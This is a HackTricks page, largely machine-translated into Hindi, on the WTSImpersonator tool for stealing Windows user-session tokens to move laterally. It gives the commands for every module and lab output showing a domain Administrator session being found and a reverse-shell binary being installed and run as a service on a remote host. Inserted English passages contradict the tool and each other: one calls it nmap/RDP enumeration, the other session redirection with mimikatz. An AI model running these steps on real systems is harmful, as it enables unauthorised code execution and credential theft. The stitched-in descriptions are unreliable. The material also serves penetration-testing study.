<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>

WTS Impersonator "यहां बिना सामान्य "टोकन अनुकरण तकनीक" का उपयोग किए बिना उपयोगकर्ताओं की गणना करने और अन्य उपयोगकर्ताओं के टोकन चुराने के लिए "बारीकी से विकसित" किया जाता है। यह अच्छा और आसान लैटरल मूवमेंट को संचालित रखने की अनुमति देता है, यह तकनीक [Omri Baso](https://www.linkedin.com/in/omri-baso/) द्वारा शोधित और विकसित की गई थी।

`WTSImpersonator` टूल [github](https://github.com/OmriBaso/WTSImpersonator) पर मिल सकता है।
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### `enum` मॉड्यूल:

टूल द्वारा चलाए जा रहे मशीन पर स्थानीय उपयोगकर्ताओं की सूची बनाएँ
```powershell
.\WTSImpersonator.exe -m enum
```
# WTS-Impersonator

## Description

The WTS-Impersonator technique allows an attacker to remotely enumerate a machine using either an IP address or a hostname. This technique takes advantage of the Windows Terminal Server (WTS) service to impersonate a user session and gather information about the target machine.

## Steps

1. **Identify the target machine**: Obtain the IP address or hostname of the machine you want to enumerate.

2. **Check if the machine has the WTS service enabled**: Use a port scanning tool, such as Nmap, to check if the target machine has port 3389 open. This port is used by the WTS service.

3. **Enumerate the machine using RDP**: If the WTS service is enabled, you can use a Remote Desktop Protocol (RDP) client to connect to the target machine. Provide the IP address or hostname, along with valid credentials if required.

4. **Gather information**: Once connected to the target machine, you can gather information about the system, such as the operating system version, installed software, and network configuration. This information can be useful for further exploitation or reconnaissance.

## Example

```plaintext
$ nmap -p 3389 <target_ip>

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 00:00 UTC
Nmap scan report for <target_ip>
Host is up (0.001s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

$ rdesktop <target_ip>

Autoselected keyboard map en-us
Connected to <target_ip>:3389
```

## Mitigation

To mitigate the risk of enumeration through WTS-Impersonator, consider the following measures:

- Disable the WTS service if it is not required.
- Implement strong password policies to prevent unauthorized access to user accounts.
- Regularly update and patch the operating system and software to address any vulnerabilities that could be exploited through enumeration techniques.
- Monitor network traffic for any suspicious activity, such as repeated failed login attempts or unusual connections to the WTS service.
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### `exec` / `exec-remote` मॉड्यूल:
"exec" और "exec-remote" दोनों **"सेवा"** संदर्भ में होने की आवश्यकता है।
स्थानीय "exec" मॉड्यूल के लिए कुछ भी चाहिए नहीं होता है, केवल WTSImpersonator.exe और आपके द्वारा निष्पादित करना चाहिए बाइनरी \(-c ध्वज\), इसमें
सामान्यतः "C:\\Windows\\System32\\cmd.exe" होता है और आप उपयोगकर्ता के रूप में एक CMD खोलेंगे, एक उदाहरण हो सकता है
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
आप PsExec64.exe का उपयोग करके सेवा संदर्भ प्राप्त कर सकते हैं।
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
इसके लिए `exec-remote` के लिए कुछ अलग है, मैंने एक सेवा बनाई है जो `PsExec.exe` की तरह दूरस्थ पर स्थापित की जा सकती है
सेवा को एक `SessionId` और एक `बाइनरी को चलाने` के रूप में एक तर्क के रूप में प्राप्त करेगी और यदि सही अनुमतियाँ होंगी तो यह दूरस्थ पर स्थापित और निष्पादित की जाएगी
एक उदाहरण रन निम्नलिखित दिखेगा:
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
जैसा कि ऊपर दिखाया गया है, व्यवस्थापक खाते का `Sessionid` `2` है, इसलिए हम इसे दूरस्थ कोड को क्रियान्वित करते समय `id` चर में उपयोग करते हैं।
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### `user-hunter` मॉड्यूल:

यूजर हंटर मॉड्यूल आपको कई मशीनों की जाँच करने और यदि एक दिए गए उपयोगकर्ता को पाया जाता है, तो यह उपयोगकर्ता के लिए कोड निष्पादित करेगा।
यह उपयोगी होता है जब कुछ मशीनों पर स्थानीय प्रशासक अधिकार होते हुए "डोमेन एडमिन" की खोज की जाती है।
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
# WTS Impersonator

## Description

The WTS Impersonator technique allows an attacker to steal user credentials by impersonating a Windows Terminal Server (WTS) session. This technique takes advantage of the fact that WTS sessions can be redirected to the attacker's machine, allowing them to intercept and capture user credentials.

## Exploitation

To exploit this technique, the attacker needs to have administrative access to the target machine. They can then use tools like `mstsc.exe` or `tscon.exe` to redirect a WTS session to their own machine. Once the session is redirected, the attacker can use tools like `mimikatz` to capture user credentials.

## Mitigation

To mitigate the risk of WTS Impersonator attacks, it is recommended to follow these best practices:

- Limit administrative access to the target machine to trusted individuals only.
- Implement strong password policies and enforce regular password changes.
- Monitor WTS session redirections and investigate any suspicious activity.
- Use multi-factor authentication to add an extra layer of security to user credentials.

## References

- [https://attack.mitre.org/techniques/T1563/003/](https://attack.mitre.org/techniques/T1563/003/)
- [https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/welcome-to-remote-desktop-services](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/welcome-to-remote-desktop-services)
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

